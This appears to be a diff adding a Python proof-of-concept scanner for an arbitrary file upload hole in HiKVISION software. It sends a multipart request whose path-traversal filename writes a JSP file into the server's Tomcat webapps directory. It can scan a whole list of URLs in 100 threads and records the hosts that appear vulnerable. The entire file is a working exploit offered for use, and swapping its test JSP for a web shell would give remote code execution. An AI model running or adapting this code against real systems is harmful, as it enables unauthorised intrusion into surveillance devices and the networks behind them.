@@ -1,0 +1,76 @@
+import requests,sys,re,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test="""
+  _    _ _____ _  ____      _______  _____ _____ ____  _   _ 
+ | |  | |_   _| |/ /\ \    / /_   _|/ ____|_   _/ __ \| \ | |
+ | |__| | | | | ' /  \ \  / /  | | | (___   | || |  | |  \| |
+ |  __  | | | |  <    \ \/ /   | |  \___ \  | || |  | | . ` |
+ | |  | |_| |_| . \    \  /   _| |_ ____) |_| || |__| | |\  |
+ |_|  |_|_____|_|\_\    \/   |_____|_____/|_____\____/|_| \_|
+                                                             
+         
+"""
+
+
+
+    print(test)
+
+
+
+def main():
+    banner()
+    parser=argparse.ArgumentParser(description='HiKVISION任意文件上传漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
+    args=parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+
+def poc(target):
+    url_payload= '/center/api/files'
+    headers={
+        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a'
+    }
+    data="""
+    ------WebKitFormBoundary9PggsiM755PLa54a
+    Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp" 
+    Content-Type: application/zip
+    
+    <%out.print("test3");%>
+    
+    ------WebKitFormBoundary9PggsiM755PLa54a--
+"""
+
+    try:
+        res1=requests.post(url=target+url_payload,headers=headers,data=data,timeout=10)
+        if res1.status_code==200 and "../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp" in res1.text:
+            print( f"[+]{target} 存在漏洞！")
+            with open('result.txt','a',encoding='utf-8')as fp:
+                fp.write(target+'\n')
+                return True
+        else:
+            print('[-] 不存在漏洞')
+            return False
+    except:
+        print('目标网站存在问题，无法访问')
+
+
+
+if __name__ =='__main__':
+    main()
